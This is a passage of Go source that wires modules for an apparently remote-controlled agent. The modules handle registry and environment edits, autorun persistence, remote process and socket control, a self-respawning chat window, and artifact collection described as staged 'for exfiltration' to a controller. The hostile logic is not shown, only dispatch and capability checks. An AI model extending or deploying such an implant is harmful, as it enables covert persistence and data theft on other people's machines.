			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload filemanager.FileManagerCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			switch action {
			case "list-directory", "read-file":
				if !state.hasCapability("file-manager.explore") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "file-manager.explore"))
				}
			case "create-entry", "rename-entry", "move-entry", "delete-entry", "update-file":
				if !state.hasCapability("file-manager.modify") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "file-manager.modify"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *fileManagerModule) Shutdown(context.Context) error {
	return nil
}

type registryModule struct {
	manager *registrymgr.Manager
}

type environmentModule struct {
	manager *environmentmgr.Manager
}

type triggerMonitorModule struct {
	manager *triggermgr.Manager
}

type geoModule struct {
	manager *geolocationmgr.Manager
}

func newRegistryModule() Module {
	return &registryModule{}
}

func (m *registryModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:           "registry",
		Title:        "Registry Manager",
		Description:  "Inspect and modify native configuration stores (registry, defaults, dconf).",
		Commands:     []string{"registry"},
		Capabilities: registryModuleCapabilities(),
	}
}

func registryModuleCapabilities() []ModuleCapability {
	profile := registrymgr.NativeCapabilities()
	capabilities := make([]ModuleCapability, 0, 2)
	if profile.Enumerate {
		capabilities = append(capabilities, ModuleCapability{
			ID:          "registry.inspect",
			Name:        "registry.inspect",
			Description: "Enumerate registry hives, keys, and values.",
		})
	}
	if profile.Mutate {
		capabilities = append(capabilities, ModuleCapability{
			ID:          "registry.modify",
			Name:        "registry.modify",
			Description: "Create, edit, and delete registry keys and values.",
		})
	}
	return capabilities
}

func (m *environmentModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "environment-variables",
		Title:       "Environment Variables",
		Description: "List and modify environment variables on the host system.",
		Commands:    []string{"environment-variables"},
		Capabilities: []ModuleCapability{
			{
				ID:          "environment.inspect",
				Name:        "environment.inspect",
				Description: "Enumerate current environment variables.",
			},
			{
				ID:          "environment.modify",
				Name:        "environment.modify",
				Description: "Create, update, or remove environment variables.",
			},
		},
	}
}

func (m *environmentModule) ID() string {
	return "environment-variables"
}

func (m *environmentModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *environmentModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *environmentModule) configure(Config) error {
	if m.manager == nil {
		m.manager = environmentmgr.NewManager()
	}
	return nil
}

func (m *environmentModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "environment subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *environmentModule) Shutdown(context.Context) error { return nil }

func (m *triggerMonitorModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "trigger-monitor",
		Title:       "Trigger Monitor",
		Description: "Configure trigger telemetry collection cadence and content.",
		Commands:    []string{"trigger-monitor"},
		Capabilities: []ModuleCapability{
			{
				ID:          "trigger-monitor.observe",
				Name:        "trigger-monitor.observe",
				Description: "Retrieve trigger monitor status and metrics.",
			},
			{
				ID:          "trigger-monitor.configure",
				Name:        "trigger-monitor.configure",
				Description: "Update trigger monitor feed and collection parameters.",
			},
		},
	}
}

func (m *triggerMonitorModule) ID() string { return "trigger-monitor" }

func (m *triggerMonitorModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *triggerMonitorModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *triggerMonitorModule) configure(Config) error {
	if m.manager == nil {
		m.manager = triggermgr.NewManager()
	}
	return nil
}

func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "trigger monitor subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *triggerMonitorModule) Shutdown(context.Context) error { return nil }

func (m *geoModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "ip-geolocation",
		Title:       "IP Geolocation",
		Description: "Resolve IP addresses to synthetic geographic metadata.",
		Commands:    []string{"ip-geolocation"},
		Capabilities: []ModuleCapability{
			{
				ID:          "ip-geolocation.lookup",
				Name:        "ip-geolocation.lookup",
				Description: "Perform IP geolocation lookups via configured providers.",
			},
			{
				ID:          "ip-geolocation.providers",
				Name:        "ip-geolocation.providers",
				Description: "Enumerate supported geolocation providers and defaults.",
			},
		},
	}
}

func (m *geoModule) ID() string { return "ip-geolocation" }

func (m *geoModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *geoModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *geoModule) configure(cfg Config) error {
	if m.manager == nil {
		m.manager = geolocationmgr.NewManager(cfg.Geolocation)
		return nil
	}
	m.manager.ApplyConfig(cfg.Geolocation)
	return nil
}

func (m *geoModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "geolocation subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *geoModule) Shutdown(context.Context) error { return nil }

func (m *registryModule) ID() string {
	return "registry"
}

func (m *registryModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *registryModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *registryModule) configure(cfg Config) error {
	if m.manager == nil {
		m.manager = registrymgr.NewManager(cfg.Logger)
		return nil
	}
	m.manager.UpdateLogger(cfg.Logger)
	return nil
}

func (m *registryModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "registry subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *registryModule) Shutdown(context.Context) error {
	return nil
}

type startupModule struct {
	manager *startupmgr.Manager
}

func newStartupModule() Module {
	return &startupModule{}
}

func (m *startupModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:           "startup-manager",
		Title:        "Startup Manager",
		Description:  "Enumerate and manage autorun persistence entries across supported schedulers.",
		Commands:     []string{"startup-manager"},
		Capabilities: startupModuleCapabilities(),
	}
}

func startupModuleCapabilities() []ModuleCapability {
	profile := startupmgr.NativeCapabilities()
	capabilities := make([]ModuleCapability, 0, 2)
	if profile.Enumerate {
		capabilities = append(capabilities, ModuleCapability{
			ID:          "startup.enumerate",
			Name:        "startup.enumerate",
			Description: "Enumerate autorun entries and associated telemetry.",
		})
	}
	if profile.Manage {
		capabilities = append(capabilities, ModuleCapability{
			ID:          "startup.manage",
			Name:        "startup.manage",
			Description: "Create, toggle, and remove autorun entries across scopes.",
		})
	}
	return capabilities
}

func (m *startupModule) ID() string {
	return "startup-manager"
}

func (m *startupModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *startupModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *startupModule) configure(cfg Config) error {
	if m.manager == nil {
		m.manager = startupmgr.NewManager(cfg.Logger)
		return nil
	}
	m.manager.UpdateLogger(cfg.Logger)
	return nil
}

func (m *startupModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "startup subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *startupModule) Shutdown(context.Context) error {
	return nil
}

type taskManagerModule struct {
	manager    *taskmanager.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *taskManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "task-manager",
		Title:       "Task Manager",
		Description: "Enumerate and control processes on the remote host.",
		Commands:    []string{"task-manager"},
		Capabilities: []ModuleCapability{
			{
				ID:          "task-manager.list",
				Name:        "task-manager.list",
				Description: "Collect real-time process snapshots with metadata.",
			},
			{
				ID:          "task-manager.control",
				Name:        "task-manager.control",
				Description: "Start and orchestrate process actions on demand.",
			},
		},
	}
}

func (m *taskManagerModule) ID() string {
	return "task-manager"
}

func (m *taskManagerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *taskManagerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *taskManagerModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(taskManagerModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *taskManagerModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *taskManagerModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *taskManagerModule) configure(runtime Config) error {
	if m.manager == nil {
		m.manager = taskmanager.NewManager(runtime.Logger)
		return nil
	}
	m.manager.UpdateLogger(runtime.Logger)
	return nil
}

func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "task manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload taskmanager.TaskManagerCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			switch payload.Request.Operation {
			case taskmanager.OperationList, taskmanager.OperationDetail:
				if !state.hasCapability("task-manager.list") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.list"))
				}
			case taskmanager.OperationStart, taskmanager.OperationAction:
				if !state.hasCapability("task-manager.control") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.control"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *taskManagerModule) Shutdown(context.Context) error {
	return nil
}

type tcpConnectionsModule struct {
	manager    *tcpconnections.Manager
	extensions *moduleExtensionState
	extOnce    sync.Once
}

func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "tcp-connections",
		Title:       "TCP Connections",
		Description: "Enumerate and govern active TCP sockets exposed by the host.",
		Commands:    []string{"tcp-connections"},
		Capabilities: []ModuleCapability{
			{
				ID:          "tcp-connections.enumerate",
				Name:        "tcp-connections.enumerate",
				Description: "Collect real-time socket state with process attribution.",
			},
			{
				ID:          "tcp-connections.control",
				Name:        "tcp-connections.control",
				Description: "Stage enforcement actions for suspicious remote peers.",
			},
		},
	}
}

func (m *tcpConnectionsModule) ID() string {
	return "tcp-connections"
}

func (m *tcpConnectionsModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *tcpConnectionsModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *tcpConnectionsModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(tcpConnectionsModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *tcpConnectionsModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *tcpConnectionsModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *tcpConnectionsModule) configure(runtime Config) error {
	cfg := tcpconnections.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = tcpconnections.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "tcp connections subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload tcpconnections.TcpConnectionsCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			if action == "enumerate" || action == "" {
				if !state.hasCapability("tcp-connections.enumerate") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "tcp-connections.enumerate"))
				}
			} else {
				if !state.hasCapability("tcp-connections.control") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "tcp-connections.control"))
				}
			}
		}
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *tcpConnectionsModule) Shutdown(context.Context) error {
	return nil
}

type recoveryModule struct {
	manager *recovery.Manager
}

func (m *recoveryModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "recovery",
		Title:       "Recovery Operations",
		Description: "Coordinate staged collection tasks and payload recovery.",
		Commands:    []string{"recovery"},
		Capabilities: []ModuleCapability{
			{
				ID:          "recovery.queue",
				Name:        "Recovery queue",
				Description: "Queue recovery jobs for background execution and monitoring.",
			},
			{
				ID:          "recovery.collect",
				Name:        "Artifact collection",
				Description: "Collect artifacts staged by upstream modules for exfiltration.",
			},
		},
	}
}

func (m *recoveryModule) ID() string {
	return "recovery"
}

func (m *recoveryModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *recoveryModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *recoveryModule) configure(runtime Config) error {
	cfg := recovery.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = recovery.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *recoveryModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "recovery subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *recoveryModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown()
	}
	return nil
}

type clientChatModule struct {
	supervisor *clientchat.Supervisor
	extensions *moduleExtensionState
	extOnce    sync.Once
	hooksMu    sync.Mutex
	hooks      map[string]func()
	pending    map[string]clientchat.OperatorMessageConsumer
}

func (m *clientChatModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "client-chat",
		Title:       "Client Chat",
		Description: "Maintain a persistent, controller-managed chat window on the client.",
		Commands:    []string{"client-chat"},
		Capabilities: []ModuleCapability{
			{
				ID:          "client-chat.persistent",
				Name:        "Persistent window",
				Description: "Keep the chat interface open continuously and respawn it if terminated.",
			},
			{
				ID:          "client-chat.alias",
				Name:        "Alias control",
				Description: "Allow the controller to update operator and client aliases in real time.",
			},
		},
	}
}

func (m *clientChatModule) ID() string {
	return "client-chat"
}

func (m *clientChatModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *clientChatModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *clientChatModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(clientChatModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *clientChatModule) RegisterExtension(extension ModuleExtension) error {
	source := strings.TrimSpace(extension.Source)
	extension.Source = source
	if err := m.extensionState().register(extension); err != nil {
		return err
	}
	if extension.Hooks.ClientChatDelivery != nil {
		if err := m.installDeliveryHook(source, extension.Hooks.ClientChatDelivery); err != nil {
			_ = m.extensionState().unregister(source)
			return err
		}
	}
	return nil
}

func (m *clientChatModule) UnregisterExtension(source string) error {
	if err := m.extensionState().unregister(source); err != nil {
		return err
	}
	m.removeDeliveryHook(source)
	return nil
}

func (m *clientChatModule) installDeliveryHook(source string, consumer clientchat.OperatorMessageConsumer) error {
	trimmed := strings.TrimSpace(source)
	if trimmed == "" {
		return fmt.Errorf("extension source required")
	}
	if consumer == nil {
		return nil
	}

	m.hooksMu.Lock()
	if m.supervisor == nil {
		if m.pending == nil {
			m.pending = make(map[string]clientchat.OperatorMessageConsumer)
		}
		m.pending[trimmed] = consumer
		m.hooksMu.Unlock()
		return nil
	}
	existing := m.hooks[trimmed]
	m.hooksMu.Unlock()

	if existing != nil {
		existing()
	}

	cancel, err := m.supervisor.RegisterDeliveryConsumer(trimmed, consumer)
	if err != nil {
		return err
	}

	m.hooksMu.Lock()
	if m.hooks == nil {
		m.hooks = make(map[string]func())
	}
	m.hooks[trimmed] = cancel
	if m.pending != nil {
		delete(m.pending, trimmed)
	}
	m.hooksMu.Unlock()
	return nil
}

func (m *clientChatModule) applyPendingHooks() error {
	m.hooksMu.Lock()
	if len(m.pending) == 0 {
		m.hooksMu.Unlock()
		return nil
	}
	pending := make(map[string]clientchat.OperatorMessageConsumer, len(m.pending))
	for source, consumer := range m.pending {
		pending[source] = consumer
	}
	m.pending = nil
	m.hooksMu.Unlock()

	for source, consumer := range pending {
		if err := m.installDeliveryHook(source, consumer); err != nil {
			return err
		}
	}
	return nil
}

func (m *clientChatModule) removeDeliveryHook(source string) {
	trimmed := strings.TrimSpace(source)

	m.hooksMu.Lock()
	var cancels []func()
	if trimmed == "" {
		if len(m.hooks) > 0 {
			cancels = make([]func(), 0, len(m.hooks))
			for _, cancel := range m.hooks {
				if cancel != nil {
					cancels = append(cancels, cancel)
				}
			}
			m.hooks = nil
		}
		m.pending = nil
		m.hooksMu.Unlock()
		for _, cancel := range cancels {
			cancel()
		}
		return
	}

	delete(m.pending, trimmed)
	if cancel := m.hooks[trimmed]; cancel != nil {
		cancels = append(cancels, cancel)
	}
	delete(m.hooks, trimmed)
	m.hooksMu.Unlock()

	for _, cancel := range cancels {
		cancel()
	}
}

func (m *clientChatModule) configure(runtime Config) error {
	cfg := clientchat.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.supervisor == nil {
		m.supervisor = clientchat.NewSupervisor(cfg)
	} else {
		m.supervisor.UpdateConfig(cfg)
	}
	if err := m.applyPendingHooks(); err != nil {
		return err
	}
	return nil
}

func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.supervisor == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "client chat subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if len(cmd.Payload) > 0 {
		var payload protocol.ClientChatCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			action := strings.TrimSpace(strings.ToLower(payload.Action))
			requireAlias := func() bool {
				if payload.Aliases != nil {
					if strings.TrimSpace(payload.Aliases.Operator) != "" || strings.TrimSpace(payload.Aliases.Client) != "" {
						return true
					}
				}
				if payload.Message != nil {
					if strings.TrimSpace(payload.Message.Alias) != "" {
						return true
					}
				}
				return false
			}
			switch action {
			case "", "start":
				if !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
				if requireAlias() && !state.hasCapability("client-chat.alias") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
				}
			case "configure":
				if payload.Features != nil && !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
				if requireAlias() && !state.hasCapability("client-chat.alias") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
				}
			case "send-message":
				if !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
				if requireAlias() && !state.hasCapability("client-chat.alias") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
				}
			case "stop":
				if !state.hasCapability("client-chat.persistent") {
					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
				}
			}
		}
	}
	return WrapCommandResult(m.supervisor.HandleCommand(ctx, cmd))
}

func (m *clientChatModule) Shutdown(ctx context.Context) error {
	if m.supervisor != nil {
		m.supervisor.Shutdown(ctx)
	}
	m.removeDeliveryHook("")
	return nil
}

type systemInfoModule struct {
	collector     *systeminfo.Collector
	extensions    *moduleExtensionState
	extOnce       sync.Once
	telemetryOnce sync.Once
	telemetry     *moduleTelemetryRegistry
}

func (m *systemInfoModule) Metadata() ModuleMetadata {
	metadata := ModuleMetadata{
		ID:          "system-info",
		Title:       "System Information",
		Description: "Collect host metadata, hardware configuration, and runtime inventory.",
		Commands:    []string{"system-info"},
		Capabilities: []ModuleCapability{
			{
				ID:          "system-info.snapshot",
				Name:        "System snapshot",
				Description: "Produce structured operating system and hardware inventories.",
			},
			{
				ID:          "system-info.telemetry",
				Name:        "System telemetry",
				Description: "Surface live telemetry metrics used by scheduling and recovery modules.",
			},
		},
	}
	if descriptor, ok := manifest.LookupTelemetry("system-info.telemetry"); ok {
		metadata.Telemetry = append(metadata.Telemetry, ModuleTelemetryDescriptor{
			ID:          descriptor.ID,
			Name:        descriptor.Name,
			Description: descriptor.Description,
		})
	}
	return metadata
}

func (m *systemInfoModule) ID() string {
	return "system-info"
}

func (m *systemInfoModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *systemInfoModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *systemInfoModule) extensionState() *moduleExtensionState {
	m.extOnce.Do(func() {
		m.extensions = newModuleExtensionState(systemInfoModuleBaseCapabilities)
	})
	return m.extensions
}

func (m *systemInfoModule) RegisterExtension(extension ModuleExtension) error {
	return m.extensionState().register(extension)
}

func (m *systemInfoModule) UnregisterExtension(source string) error {
	return m.extensionState().unregister(source)
}

func (m *systemInfoModule) telemetryRegistry() *moduleTelemetryRegistry {
	if m == nil {
		return nil
	}
	m.telemetryOnce.Do(func() {
		if m.telemetry == nil {
			m.telemetry = newModuleTelemetryRegistry()
		}
	})
	return m.telemetry
}

func (m *systemInfoModule) RegisterTelemetry(source string, descriptors []ModuleTelemetryDescriptor) error {
	registry := m.telemetryRegistry()
	if registry == nil {
		return nil
	}
	return registry.register(source, descriptors)
}

func (m *systemInfoModule) UnregisterTelemetry(source string) error {
	if m == nil || m.telemetry == nil {
		return nil
	}
	return m.telemetry.unregister(source)
}

func (m *systemInfoModule) configure(runtime Config) error {
	if runtime.Provider == nil {
		return fmt.Errorf("missing agent provider")
	}
	m.collector = systeminfo.NewCollector(runtime.Provider, runtime.BuildVersion)
	return nil
}

func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.collector == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "system information subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	state := m.extensionState()
	if !state.hasCapability("system-info.snapshot") {
		return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "system-info.snapshot"))
	}
	if len(cmd.Payload) > 0 {
		var payload systeminfo.SystemInfoCommandPayload
		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
			if payload.Refresh && !state.hasCapability("system-info.telemetry") {
				return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "system-info.telemetry"))
			}
		}
	}
	return WrapCommandResult(m.collector.HandleCommand(ctx, cmd))
}

func (m *systemInfoModule) Shutdown(context.Context) error {
	return nil
}

func newNotesModule() *notesModule {
	return &notesModule{}
}

type notesModule struct {
	mu        sync.RWMutex
	manager   *notes.Manager
	agentID   string
	baseURL   string
	authKey   string
	client    *http.Client
	logger    *log.Logger
	userAgent string
}

func (m *notesModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "notes",
		Title:       "Incident Notes",
		Description: "Secure local note taking synchronized with the controller vault.",
		Commands:    []string{"notes.sync"},
		Capabilities: []ModuleCapability{
			{
				ID:          "notes.sync",
				Name:        "Notes sync",
				Description: "Synchronize local incident notes to the operator vault with delta compression.",
			},
		},
	}
}

func (m *notesModule) ID() string {
	return "notes"
}

func (m *notesModule) Init(_ context.Context, cfg Config) error {
	m.applyConfig(cfg)
	return nil
}

func (m *notesModule) UpdateConfig(cfg Config) error {
	m.applyConfig(cfg)
	return nil
}

func (m *notesModule) applyConfig(cfg Config) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.manager = cfg.Notes
	m.agentID = cfg.AgentID
	m.baseURL = cfg.BaseURL
	m.authKey = cfg.AuthKey
	m.client = cfg.HTTPClient
	m.logger = cfg.Logger
	m.userAgent = cfg.UserAgent
}

func (m *notesModule) snapshot() (*notes.Manager, *http.Client, string, string, string, string, *log.Logger) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.manager, m.client, m.baseURL, m.agentID, m.authKey, m.userAgent, m.logger
}

func (m *notesModule) Handle(ctx context.Context, cmd protocol.Command) error {
	manager, client, baseURL, agentID, authKey, userAgent, logger := m.snapshot()
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	if manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "notes manager unavailable",
			CompletedAt: completedAt,
		})
	}

	if err := manager.SyncShared(ctx, client, baseURL, agentID, authKey, userAgent); err != nil {
		if logger != nil {
			logger.Printf("notes sync failed: %v", err)
		}
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: completedAt,
		})
	}

	return WrapCommandResult(protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     true,
		CompletedAt: completedAt,
	})
}

func (m *notesModule) Shutdown(context.Context) error {
	return nil
}